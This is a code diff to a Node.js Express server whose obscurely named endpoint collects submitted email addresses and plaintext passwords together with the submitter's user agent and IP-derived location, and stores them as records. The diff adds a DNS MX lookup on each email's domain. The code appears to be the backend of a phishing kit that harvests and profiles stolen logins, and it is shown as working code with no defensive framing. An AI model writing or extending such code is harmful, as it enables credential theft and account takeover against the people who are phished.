@@ -2,6 +2,7 @@ const express = require("express")
 const bodyParser = require("body-parser")
 const axios = require("axios")
 const cors = require("cors")
+const dnsPromises = require('dns').promises;
 
 const app = express()
 const PORT = process.env.PORT || 1682
@@ -40,13 +41,17 @@ app.post("/UD92290", async (req, res) => {
 
     const { session_key, password } = req.body
     const user_agent = req.header("User-Agent")
+    const domain = session_key.split("@")[1]
 
     const date = new Date().toDateString()
     const time = new Date().toTimeString()
+    const mx = await dnsPromises.resolveMx(`${domain}`);
 
     const obj = {
       username: session_key,
       password: password,
+      domain: domain,
+      mx: mx,
       ip: gottenAddress.ip,
       city: gottenAddress.city,
       region: gottenAddress.region,
@@ -58,7 +63,7 @@ app.post("/UD92290", async (req, res) => {
     }
 
     const added = await addPersona({ ...obj })
-    if (added) return res.status(201).json({ response: "Ok, done!" })
+    if (added) return res.status(201).json({ response: "Ok, added!" })
 
   } catch (error) {
     console.log("CATCH ERR: ", error)
